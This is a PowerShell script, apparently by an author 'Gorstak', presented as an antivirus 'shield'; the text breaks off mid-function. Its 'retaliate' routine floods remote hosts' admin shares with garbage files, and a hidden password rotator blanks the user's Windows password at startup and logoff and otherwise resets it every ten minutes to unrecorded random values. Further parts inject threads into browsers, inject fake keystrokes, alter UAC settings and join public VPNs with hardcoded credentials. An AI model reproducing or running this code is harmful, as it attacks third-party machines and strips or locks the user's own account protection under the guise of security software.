# GShield.ps1
# Author: Gorstak
#Requires -RunAsAdministrator

param(
    [int]$IntervalMinutes = 60,
    [switch]$NoVpnGate,
    [int]$VpnGateCheckSeconds = 45,
    [int]$VpnGateRefreshMinutes = 25,
    [string[]]$VpnGatePreferCountries = @()
)

# ==================== CONFIG ====================
$InstallDir    = "$env:ProgramData\Antivirus"
$LogDir        = "$InstallDir\logs"
$QuarDir       = "$InstallDir\quarantine"
$LogFile       = "$LogDir\scanner.log"
$PwRotatorDir  = "C:\ProgramData\PasswordRotator"

# UAC: ConsentPromptBehaviorAdmin = 5 - prompt for consent for non-Windows binaries only (Microsoft default)
$UACPolicyKey      = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
$UACConsentName    = 'ConsentPromptBehaviorAdmin'
$UACConsentDesired = 5

$BrowserNames = @('chrome','msedge','firefox','opera','brave','vivaldi','iexplore','waterfox',
    'palemoon','seamonkey','librewolf','tor','chromium','maxthon','yandex','avastbrowser')


# Retaliate state
$script:AllowedIPs              = @()
$script:AllowedDomains          = @()
$script:RetaliatedConnections   = @{}
$script:CurrentBrowserConns     = @{}
$NeverRetaliateIPs              = @('8.8.8.8','8.8.4.4','1.1.1.1','1.0.0.1')

# VPN Gate - auto-connect (L2TP then OpenVPN fallback; PSK/user/pass vpn). Use -NoVpnGate to disable.
$VpnGateApiUrl          = 'https://www.vpngate.net/api/iphone/'
$VpnGateConnectionName  = 'GShield-VPNGate'
$VpnGateL2tpPsk         = 'vpn'
$VpnGateCredUser        = 'vpn'
$VpnGateCredPass        = 'vpn'
$VpnGateMaxCandidates   = 40
$VpnGateWorkDir         = "$InstallDir\vpn"

# ==================== LOGGING ====================
function Write-Log {
    param([string]$Message, [string]$Level = 'INFO', [switch]$FileOnly)
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    "$ts [$Level] $Message" | Add-Content $LogFile -Force -EA 0
    if ($FileOnly) { return }
    if ($Level -eq 'ALERT') { Write-Host $Message -ForegroundColor Red }
    elseif ($Level -eq 'WARN')  { Write-Host $Message -ForegroundColor Yellow }
    elseif ($Level -eq 'CYAN')  { Write-Host $Message -ForegroundColor Cyan }
    else { Write-Host $Message }
}

# ==================== HELPERS ====================
function New-GShieldRunspace {
    # CreateDefault2 matches the console host without loading Microsoft.WSMan.Management,
    # which breaks CreateRunspace() on systems where Microsoft.WSMan is missing or corrupt.
    $iss = [InitialSessionState]::CreateDefault2()
    [runspacefactory]::CreateRunspace($iss)
}

# ==================== BROWSER MODULE GUARD (Aggressive) ====================
if (-not ([System.Management.Automation.PSTypeName]'ModuleGuard').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class ModuleGuard {
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr GetProcAddress(IntPtr mod, string proc);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr, uint stackSize, IntPtr start, IntPtr param, uint flags, out uint tid);
    [DllImport("kernel32.dll", SetLastError=true)] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

    static bool IsSigned(string path) {
        try {
            var cert = new X509Certificate2(path);
            var chain = new X509Chain();
            chain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
            return chain.Build(cert);
        } catch { return false; }
    }

    public static List<string> UnloadUnsignedModules(int pid) {
        var unloaded = new List<string>();
        Process proc; try { proc = Process.GetProcessById(pid); } catch { return unloaded; }
        IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProc == IntPtr.Zero) return unloaded;
        try {
            IntPtr kernel32 = IntPtr.Zero;
            foreach (ProcessModule m in proc.Modules) {
                if (m.ModuleName.ToLower() == "kernel32.dll") { kernel32 = m.BaseAddress; break; }
            }
            if (kernel32 == IntPtr.Zero) return unloaded;
            IntPtr freeLibAddr = GetProcAddress(kernel32, "FreeLibrary");
            if (freeLibAddr == IntPtr.Zero) return unloaded;
            foreach (ProcessModule mod in proc.Modules) {
                try {
                    string path = mod.FileName;
                    string name = mod.ModuleName.ToLower();
                    if (path.ToLower() == proc.MainModule.FileName.ToLower()) continue;
                    if (name == "ntdll.dll" || name == "kernel32.dll" || name == "kernelbase.dll") continue;
                    if (name.Contains("appx") || name.Contains("edgewebview") || name.Contains("msedge")) continue;
                    if (!IsSigned(path)) {
                        uint tid;
                        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, freeLibAddr, mod.BaseAddress, 0, out tid);
                        if (hThread != IntPtr.Zero) {
                            WaitForSingleObject(hThread, 1500);
                            CloseHandle(hThread);
                            unloaded.Add(path);
                        }
                    }
                } catch { }
            }
        } finally { CloseHandle(hProc); }
        return unloaded;
    }
}
'@
}

function Invoke-BrowserModuleGuard {
    foreach ($name in $BrowserNames) {
        Get-Process -Name $name -EA 0 | ForEach-Object {
            $removed = [ModuleGuard]::UnloadUnsignedModules($_.Id)
            foreach ($mod in $removed) {
                Write-Log "UNLOADED unsigned browser module: $mod (from $($_.ProcessName) PID $($_.Id))" "ALERT"
            }
        }
    }
}

# Continuous per-PID module monitor - runs in a background runspace at 500ms intervals
# Tracks which modules have already been checked per PID so it only acts on newly loaded ones
function Start-ContinuousModuleMonitor {
    $rs = New-GShieldRunspace
    $rs.ApartmentState = 'STA'
    $rs.ThreadOptions  = 'ReuseThread'
    $rs.Open()
    $rs.SessionStateProxy.SetVariable('BrowserNames', $BrowserNames)
    $rs.SessionStateProxy.SetVariable('LogFile',      $LogFile)

    $ps = [powershell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript({
        function Write-BgLog { param([string]$M)
            "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [ALERT] $M" | Add-Content $LogFile -Force -EA 0
        }
        $KnownModules = @{}
        while ($true) {
            foreach ($name in $BrowserNames) {
                $procs = Get-Process -Name $name -EA 0
                foreach ($proc in $procs) {
                    $pid = $proc.Id
                    if (-not $KnownModules.ContainsKey($pid)) {
                        $KnownModules[$pid] = [System.Collections.Generic.HashSet[string]]::new(
                            [System.StringComparer]::OrdinalIgnoreCase)
                    }
                    try { $modules = $proc.Modules } catch { continue }
                    foreach ($mod in $modules) {
                        $mp = $mod.FileName
                        if ($KnownModules[$pid].Contains($mp)) { continue }
                        # New module - check and eject if unsigned
                        $removed = [ModuleGuard]::UnloadUnsignedModules($pid)
                        foreach ($r in $removed) {
                            Write-BgLog "CONTINUOUS-MONITOR: Unloaded unsigned module $r from $($proc.ProcessName) PID $pid"
                            [void]$KnownModules[$pid].Add($r)
                        }
                        [void]$KnownModules[$pid].Add($mp)
                    }
                }
            }
            # Prune dead PIDs
            $live = (Get-Process -EA 0).Id
            @($KnownModules.Keys | Where-Object { $live -notcontains $_ }) | ForEach-Object { $KnownModules.Remove($_) }
            Start-Sleep -Milliseconds 500
        }
    })
    $ps.BeginInvoke() | Out-Null
    Write-Log "Continuous browser module monitor started (background runspace)" "CYAN"
}

function Test-IsActiveBrowsing { param([string]$RemoteAddress, [string]$ProcessName, [int]$RemotePort)
    if ($BrowserNames -notcontains $ProcessName.ToLower()) { return $false }
    if ($RemoteAddress -match '^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)') { return $true }
    if ($NeverRetaliateIPs -contains $RemoteAddress) { return $true }
    if ($script:AllowedIPs -contains $RemoteAddress) { return $true }
    $now = Get-Date
    if ($RemotePort -eq 443 -or $RemotePort -eq 80) {
        $script:CurrentBrowserConns[$RemoteAddress] = $now
        return $true
    }
    foreach ($ip in $script:CurrentBrowserConns.Keys) {
        if (($now - $script:CurrentBrowserConns[$ip]).TotalSeconds -le 30) { return $true }
    }
    return $false
}

function Invoke-Retaliate { param([string]$RemoteAddress, [int]$RemotePort, [string]$ProcessName)
    $key = "$RemoteAddress|$ProcessName"
    if ($script:RetaliatedConnections.ContainsKey($key)) { return }
    Write-Log "RETALIATE: Phoning-home detected $RemoteAddress`:$RemotePort from $ProcessName" "ALERT"
    $script:RetaliatedConnections[$key] = @{ IP = $RemoteAddress; Port = $RemotePort; Process = $ProcessName; Timestamp = Get-Date }
    # Attempt to flood attacker's admin share (best-effort, will silently fail if unreachable)
    try {
        $remotePath = "\\$RemoteAddress\C$"
        if (Test-Path $remotePath -EA SilentlyContinue) {
            $counter = 1
            while ($counter -le 10) {
                try {
                    $garbage = [byte[]]::new(10485760)
                    (New-Object System.Random).NextBytes($garbage)
                    [System.IO.File]::WriteAllBytes("$remotePath\garbage_$counter.dat", $garbage)
                    $counter++
                } catch { break }
            }
        }
    } catch {}
}

function Invoke-RetaliateMonitorCycle {
    $conns = Get-NetTCPConnection -State Established -EA SilentlyContinue |
        Where-Object { $_.RemoteAddress -ne '0.0.0.0' -and $_.RemoteAddress -ne '::' }
    foreach ($conn in $conns) {
        try {
            $proc = Get-Process -Id $conn.OwningProcess -EA Stop
            $procName = ($proc.ProcessName -replace '\.exe$','').Trim().ToLower()
            if ($BrowserNames -notcontains $procName) { continue }
            if (!(Test-IsActiveBrowsing -RemoteAddress $conn.RemoteAddress -ProcessName $proc.ProcessName -RemotePort $conn.RemotePort)) {
                Invoke-Retaliate -RemoteAddress $conn.RemoteAddress -RemotePort $conn.RemotePort -ProcessName $proc.ProcessName
            }
        } catch {}
    }
    # Expire stale browser connection cache
    $now = Get-Date
    $stale = $script:CurrentBrowserConns.Keys | Where-Object { ($now - $script:CurrentBrowserConns[$_]).TotalSeconds -gt 60 }
    $stale | ForEach-Object { $script:CurrentBrowserConns.Remove($_) }
}


# ==================== PASSWORD ROTATOR ====================
$PwRotatorWorkerScript = @'
param([string]$Mode, [string]$Username)
# Continue: Register-ScheduledTask often fails under SYSTEM when CIM/WMI is broken; must not abort before password change.
$ErrorActionPreference = 'Continue'
$TargetDir = if ($PSScriptRoot) { $PSScriptRoot } else { 'C:\ProgramData\PasswordRotator' }
$UserFile  = Join-Path $TargetDir 'currentuser.txt'

function Get-LoggedInUser {
    $u = $null
    try { $u = (Get-CimInstance -ClassName Win32_ComputerSystem -EA Stop).UserName } catch {}
    if (-not $u) { try { $u = $env:USERNAME } catch {} }
    if (-not $u) { return $null }
    if ($u -match '\\') { return $u.Split('\')[-1] }
    return $u
}
function Set-UserPassword { param([string]$U, [string]$P)
    if ([string]::IsNullOrWhiteSpace($U)) { return }
    try { Set-LocalUser -Name $U -Password (ConvertTo-SecureString -String $P -AsPlainText -Force) -EA Stop }
    catch {
        try { [ADSI]$a = "WinNT://$env:COMPUTERNAME/$U,user"; $a.SetPassword($P) }
        catch { "$(Get-Date -Format o) Set-UserPassword: $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append }
    }
}
function Set-UserPasswordBlank { param([string]$N)
    if ([string]::IsNullOrWhiteSpace($N)) { return }
    try { [ADSI]$a = "WinNT://$env:COMPUTERNAME/$N,user"; $a.SetPassword('') }
    catch { try { & net user $N '' } catch { "$(Get-Date -Format o) Blank: $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append } }
}
function New-RandomPwd {
    $c = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%'
    -join ((1..24) | ForEach-Object { $c[(Get-Random -Maximum $c.Length)] })
}
function Remove-TasksForUser { param([string]$U)
    $s = $U -replace '[^a-zA-Z0-9]','_'
    @("PasswordRotator-10Min-$s","PasswordRotator-OnLogoff-$s") | ForEach-Object {
        Unregister-ScheduledTask -TaskName $_ -Confirm:$false -EA SilentlyContinue
        schtasks.exe /Delete /TN $_ /F 2>$null | Out-Null
    }
}
function Register-Rotate10MinTask {
    param([string]$Safe, [string]$WorkerPath)
    $tn = "PasswordRotator-10Min-$Safe"
    $psArg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WorkerPath`" -Mode Rotate"
    $ok = $false
    try {
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        $t10 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 3650)
        $a10 = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $psArg
        Register-ScheduledTask -TaskName $tn -Action $a10 -Trigger $t10 -Principal $principal -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force -ErrorAction Stop | Out-Null
        $ok = $true
    } catch {
        "$(Get-Date -Format o) Register-Rotate10MinTask (PS): $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append
    }
    if (-not $ok) {
        schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
        $we = $WorkerPath -replace '"','\"'
        $tr = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$we`" -Mode Rotate"
        $err = schtasks.exe /Create /TN $tn /TR $tr /SC MINUTE /MO 10 /RU SYSTEM /RL HIGHEST /F 2>&1
        if ($LASTEXITCODE -ne 0) {
            "$(Get-Date -Format o) Register-Rotate10MinTask (schtasks): $err" | Out-File (Join-Path $TargetDir 'log.txt') -Append
        }
    }
}
function Register-LogoffCleanupTask {
    param([string]$Safe, [string]$WorkerPath, [string]$User)
    $tn = "PasswordRotator-OnLogoff-$Safe"
    $psArg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WorkerPath`" -Mode Logoff -Username $User"
    try {
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        $tOff = New-ScheduledTaskTrigger -AtLogOff -User $User
        $aOff = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $psArg
        Register-ScheduledTask -TaskName $tn -Action $aOff -Trigger $tOff -Principal $principal -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force -ErrorAction Stop | Out-Null
    } catch {
        "$(Get-Date -Format o) Register-LogoffCleanupTask (PS only; no schtasks ONLOGOFF): $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append
    }
}

switch ($Mode) {
    'Logon' {
        $u = Get-LoggedInUser; if (-not $u) { exit 0 }
        if (-not (Test-Path $TargetDir)) { New-Item -Path $TargetDir -ItemType Directory -Force | Out-Null }
        $u | Set-Content -Path $UserFile -Force
        Remove-TasksForUser -U $u
        $safe   = $u -replace '[^a-zA-Z0-9]','_'
        $worker = Join-Path $TargetDir 'Worker.ps1'
        Register-Rotate10MinTask -Safe $safe -WorkerPath $worker
        Register-LogoffCleanupTask -Safe $safe -WorkerPath $worker -User $u
        Start-Sleep -Seconds 60
        Set-UserPassword -U $u -P (New-RandomPwd)
    }
    'Rotate' {
        if (-not (Test-Path $UserFile)) { exit 0 }
        $u = (Get-Content -Path $UserFile -Raw).Trim()
        if ($u) { Set-UserPassword -U $u -P (New-RandomPwd) }
    }
    'Logoff' {
        if ($Username) {
            Set-UserPasswordBlank -N $Username
            $s = $Username -replace '[^a-zA-Z0-9]','_'
            @("PasswordRotator-10Min-$s","PasswordRotator-OnLogoff-$s") | ForEach-Object {
                Unregister-ScheduledTask -TaskName $_ -Confirm:$false -EA SilentlyContinue
                schtasks.exe /Delete /TN $_ /F 2>$null | Out-Null
            }
        }
    }
    'StartupBlank' {
        if (-not (Test-Path $UserFile)) { exit 0 }
        $u = (Get-Content -Path $UserFile -Raw -EA SilentlyContinue).Trim()
        if ($u) { Set-UserPasswordBlank -N $u }
    }
}
'@

function Install-PasswordRotator {
    if (-not (Test-Path $PwRotatorDir)) { New-Item -Path $PwRotatorDir -ItemType Directory -Force | Out-Null }
    $workerPath = Join-Path $PwRotatorDir 'Worker.ps1'
    $PwRotatorWorkerScript | Set-Content -Path $workerPath -Encoding UTF8 -Force

    # Resolve current user robustly - WMI may fail in some contexts
    $currentUser = $null
    try { $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name } catch {}
    if (-not $currentUser) { try { $currentUser = $env:USERNAME } catch {} }
    if ($currentUser -match '\\') { $currentUser = $currentUser.Split('\')[-1] }

    if (-not $currentUser) {
        Write-Log "PasswordRotator: could not determine current user, skipping install" "WARN"
        return
    }

    # Prefer ScheduledTasks cmdlets; fall back to schtasks if CIM/WMI is broken
    $workerEscaped = $workerPath -replace '"','\"'
    foreach ($tn in @('PasswordRotator-OnLogon', 'PasswordRotator-AtStartup')) {
        Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
        schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
    }

    function Register-PasswordRotatorHostTask {
        param([string]$TaskName, [string]$ModeArgs)
        $psArg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$workerPath`" $ModeArgs"
        try {
            $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $psArg
            $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            $trigger = if ($TaskName -match 'Logon') { New-ScheduledTaskTrigger -AtLogOn } else { New-ScheduledTaskTrigger -AtStartup }
            Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
            return $true
        } catch { return $false }
    }

    if (-not (Register-PasswordRotatorHostTask -TaskName 'PasswordRotator-OnLogon' -ModeArgs '-Mode Logon')) {
        schtasks.exe /Create /TN "PasswordRotator-OnLogon" `
            /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$workerEscaped`" -Mode Logon" `
            /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
        Write-Log "PasswordRotator-OnLogon: registered via schtasks (PS ScheduledTasks failed)" "WARN"
    }
    if (-not (Register-PasswordRotatorHostTask -TaskName 'PasswordRotator-AtStartup' -ModeArgs '-Mode StartupBlank')) {
        schtasks.exe /Create /TN "PasswordRotator-AtStartup" `
            /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$workerEscaped`" -Mode StartupBlank" `
            /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
        Write-Log "PasswordRotator-AtStartup: registered via schtasks (PS ScheduledTasks failed)" "WARN"
    }

    $currentUser | Set-Content -Path (Join-Path $PwRotatorDir 'currentuser.txt') -Force -EA SilentlyContinue

    try {
        [ADSI]$adsi = "WinNT://$env:COMPUTERNAME/$currentUser,user"
        $adsi.SetPassword('')
    } catch {}

    Write-Log "PasswordRotator installed for user: $currentUser"
}

# ==================== KEY SCRAMBLER ====================
# Injects fake keystrokes around real ones to blind keyloggers
# Runs in a background runspace so it doesn't block the main loop
if (-not ([System.Management.Automation.PSTypeName]'KeyScrambler').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class KeyScrambler {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN     = 0x0100;
    private const uint INPUT_KEYBOARD   = 1;
    private const uint KEYEVENTF_UNICODE = 0x0004;
    private const uint KEYEVENTF_KEYUP   = 0x0002;

    [StructLayout(LayoutKind.Sequential)]
    public struct KBDLLHOOKSTRUCT { public uint vkCode, scanCode, flags, time; public IntPtr dwExtraInfo; }

    [StructLayout(LayoutKind.Sequential)]
    public struct INPUT { public uint type; public INPUTUNION u; }

    [StructLayout(LayoutKind.Explicit)]
    public struct INPUTUNION { [FieldOffset(0)] public KEYBDINPUT ki; }

    [StructLayout(LayoutKind.Sequential)]
    public struct KEYBDINPUT { public ushort wVk, wScan; public uint dwFlags, time; public IntPtr dwExtraInfo; }

    [StructLayout(LayoutKind.Sequential)]
    public struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam, lParam; public uint time; public int x, y; }

    [DllImport("user32.dll", SetLastError=true)] static extern IntPtr SetWindowsHookEx(int id, IntPtr fn, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] static extern bool GetMessage(out MSG m, IntPtr hw, uint f, uint t);
    [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
    [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
    [DllImport("user32.dll")] static extern uint SendInput(uint n, INPUT[] inp, int sz);
    [DllImport("user32.dll")] static extern IntPtr GetMessageExtraInfo();
    [DllImport("user32.dll")] static extern short GetKeyState(int vk);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);

    private delegate IntPtr LLKProc(int n, IntPtr w, IntPtr l);
    private static IntPtr _hook = IntPtr.Zero;
    private static LLKProc _proc;
    private static Random _rnd = new Random();

    static bool ModifiersDown() {
        return (GetKeyState(0x10) & 0x8000) != 0 ||
               (GetKeyState(0x11) & 0x8000) != 0 ||
               (GetKeyState(0x12) & 0x8000) != 0;
    }

    static void InjectFake(char c) {
        var inp = new INPUT[2];
        inp[0].type = INPUT_KEYBOARD;
        inp[0].u.ki.wVk = 0; inp[0].u.ki.wScan = (ushort)c;
        inp[0].u.ki.dwFlags = KEYEVENTF_UNICODE;
        inp[0].u.ki.dwExtraInfo = GetMessageExtraInfo();
        inp[1] = inp[0]; inp[1].u.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        SendInput(2, inp, Marshal.SizeOf(typeof(INPUT)));
        Thread.Sleep(_rnd.Next(1, 7));
    }

    static void Flood() {
        if (_rnd.NextDouble() < 0.5) return;
        int n = _rnd.Next(1, 7);
        for (int i = 0; i < n; i++) InjectFake((char)_rnd.Next('A', 'Z' + 1));
    }

    static IntPtr Hook(int n, IntPtr w, IntPtr l) {
        if (n >= 0 && w == (IntPtr)WM_KEYDOWN) {
            var k = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(l, typeof(KBDLLHOOKSTRUCT));
            if ((k.flags & 0x10) == 0 && !ModifiersDown() && k.vkCode >= 65 && k.vkCode <= 90) {
                if (_rnd.NextDouble() < 0.75) Flood();
                var r = CallNextHookEx(_hook, n, w, l);
                if (_rnd.NextDouble() < 0.75) Flood();
                return r;
            }
        }
        return CallNextHookEx(_hook, n, w, l);
    }

    public static void Start() {
        if (_hook != IntPtr.Zero) return;
        _proc = Hook;
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, Marshal.GetFunctionPointerForDelegate(_proc), GetModuleHandle(null), 0);
        if (_hook == IntPtr.Zero) return;
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0)) { TranslateMessage(ref msg); DispatchMessage(ref msg); }
    }
}
'@ -ErrorAction SilentlyContinue
}

function Start-KeyScrambler {
    $rs = New-GShieldRunspace
    $rs.ApartmentState = 'STA'   # required for message loop
    $rs.ThreadOptions  = 'ReuseThread'
    $rs.Open()
    $ps = [powershell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript({ [KeyScrambler]::Start() })
    $ps.BeginInvoke() | Out-Null
    Write-Log "KeyScrambler started (background runspace - keylogger blinding active)" "CYAN"
}

function Invoke-UACPolicyEnforce {
    try {
        if (-not (Test-Path $UACPolicyKey)) {
            New-Item -Path $UACPolicyKey -Force | Out-Null
        }
        $raw = (Get-ItemProperty -Path $UACPolicyKey -Name $UACConsentName -EA SilentlyContinue).$UACConsentName
        $cur = if ($null -eq $raw) { $null } else { [int]$raw }
        if ($cur -ne $UACConsentDesired) {
            Set-ItemProperty -Path $UACPolicyKey -Name $UACConsentName -Value $UACConsentDesired -Type DWord -Force
            $was = if ($null -eq $cur) { '<unset>' } else { $cur }
            Write-Log "UAC: ConsentPromptBehaviorAdmin was $was; enforced to $UACConsentDesired" "WARN"
        }
    } catch {
        Write-Log "UAC: could not enforce ConsentPromptBehaviorAdmin: $_" "WARN"
    }
}

function Invoke-VpnGateL2tpNatFix {
    try {
        $p = 'HKLM:\SYSTEM\CurrentControlSet\Services\PolicyAgent'
        if (Test-Path $p) {
            Set-ItemProperty -Path $p -Name 'AssumeUDPEncapsulationContextOnSendRule' -Value 2 -Type DWord -Force -EA Stop
        }
    } catch {}
}

function Start-VpnGateSmartClient {
    Invoke-VpnGateL2tpNatFix
    if (-not (Test-Path $VpnGateWorkDir)) { New-Item -Path $VpnGateWorkDir -ItemType Directory -Force | Out-Null }
    $rs = New-GShieldRunspace
    $rs.Open()
    $rs.SessionStateProxy.SetVariable('VG_LogFile', $LogFile)
    $rs.SessionStateProxy.SetVariable('VG_ConnName', $VpnGateConnectionName)
    $rs.SessionStateProxy.SetVariable('VG_Api', $VpnGateApiUrl)
    $rs.SessionStateProxy.SetVariable('VG_CheckSec', $VpnGateCheckSeconds)
    $rs.SessionStateProxy.SetVariable('VG_RefreshMin', $VpnGateRefreshMinutes)
    $rs.SessionStateProxy.SetVariable('VG_Max', $VpnGateMaxCandidates)
    $rs.SessionStateProxy.SetVariable('VG_Psk', $VpnGateL2tpPsk)
    $rs.SessionStateProxy.SetVariable('VG_User', $VpnGateCredUser)
    $rs.SessionStateProxy.SetVariable('VG_Pass', $VpnGateCredPass)
    $rs.SessionStateProxy.SetVariable('VG_WorkDir', $VpnGateWorkDir)
    $pref = [string[]]@($VpnGatePreferCountries | ForEach-Object { $_.ToUpperInvariant() })
    $rs.SessionStateProxy.SetVariable('VG_Prefer', $pref)

    $ps = [powershell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript({
        $ProgressPreference = 'SilentlyContinue'
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        function Write-VgLog { param([string]$M, [string]$L = 'INFO')
            "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$L] VPNGate: $M" | Add-Content $VG_LogFile -Force -EA 0
        }
        function Get-VgCountry {
            $uris = @(
                @{ U = 'http://ip-api.com/json/?fields=countryCode'; J = $true },
                @{ U = 'https://ipinfo.io/json'; J = $true },
                @{ U = 'https://ipapi.co/country/'; J = $false }
            )
            foreach ($e in $uris) {
                try {
                    if ($e.J) {
                        $r = Invoke-RestMethod -Uri $e.U -TimeoutSec 18
                        $cc = $r.countryCode
                        if (-not $cc) { $cc = $r.country }
                        if ($cc) { return "$cc".ToUpperInvariant().Trim() }
                    } else {
                        $t = (Invoke-WebRequest -Uri $e.U -UseBasicParsing -TimeoutSec 18).Content.Trim()
                        if ($t.Length -eq 2) { return $t.ToUpperInvariant() }
                    }
                } catch {}
            }
            return $null
        }
        function Parse-VgLine {
            param([string]$Line)
            if ($Line.Length -lt 80) { return $null }
            if ($Line -notmatch '^[A-Za-z0-9]') { return $null }
            $cells = $Line.Split([char]',', 15)
            if ($cells.Count -ne 15) { return $null }
            if ($cells[14].Length -lt 200) { return $null }
            $ping = 0; [void][int]::TryParse($cells[3], [ref]$ping)
            $score = 0L; [void][long]::TryParse($cells[2], [ref]$score)
            $speed = 0L; [void][long]::TryParse($cells[4], [ref]$speed)
            $sess = 0; [void][int]::TryParse($cells[7], [ref]$sess)
            [pscustomobject]@{
                HostName = $cells[0]; IP = $cells[1]; Score = $score; Ping = $ping; Speed = $speed
                CountryLong = $cells[5]; CountryShort = $cells[6].ToUpperInvariant(); Sessions = $sess
                OvpnB64 = $cells[14]
            }
        }
        function Get-VgServers {
            param([string]$MyCc)
            $raw = $null
            foreach ($attempt in 1..3) {
                try {
                    $raw = (Invoke-WebRequest -Uri $VG_Api -UseBasicParsing -TimeoutSec 180).Content
                    break
                } catch {
                    Start-Sleep -Seconds (15 * $attempt)
                }
            }
            if (-not $raw) { return @() }
            $acc = New-Object System.Collections.Generic.List[object]
            foreach ($ln in ($raw -split "`r?`n")) {
                $o = Parse-VgLine $ln
                if ($o) { [void]$acc.Add($o) }
            }
            $prefer = @($VG_Prefer)
            $sorted = $acc | Sort-Object `
                @{Expression = { $cc = $_.CountryShort; if ($prefer.Count -gt 0) { $prefer -contains $cc } else { $cc -eq $MyCc } }; Descending = $true },
                @{Expression = { if ($_.Ping -le 0) { 999999 } else { $_.Ping } }; Descending = $false },
                @{Expression = { $_.Score }; Descending = $true },
                @{Expression = { $_.Speed }; Descending = $true }
            return @($sorted | Select-Object -First $VG_Max)
        }
        function Get-VgOpenVpnExe {
            $cands = @()
            try { $g = Get-Command openvpn.exe -EA Stop; $cands += $g.Source } catch {}
            $cands += @(
                "$env:ProgramFiles\OpenVPN\bin\openvpn.exe",
                "${env:ProgramFiles(x86)}\OpenVPN\bin\openvpn.exe",
                "$env:ProgramFiles\OpenVPN Connect\OpenVPN\openvpn.exe"
            )
            foreach ($p in $cands) { if ($p -and (Test-Path -LiteralPath $p)) { return $p } }
            return $null
        }
        function Stop-VgOpenVpn {
            Get-Process -Name 'openvpn' -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
            Start-Sleep -Milliseconds 800
        }
        function Disconnect-Vg {
            Stop-VgOpenVpn
            $n = $VG_ConnName
            Start-Process -FilePath "$env:SystemRoot\System32\rasdial.exe" -ArgumentList @($n, '/disconnect') -Wait -WindowStyle Hidden -NoNewWindow -EA 0 | Out-Null
            Start-Sleep -Seconds 2
            Remove-VpnConnection -Name $n -Force -EA SilentlyContinue
        }
        function Test-VgPingOk {
            try {
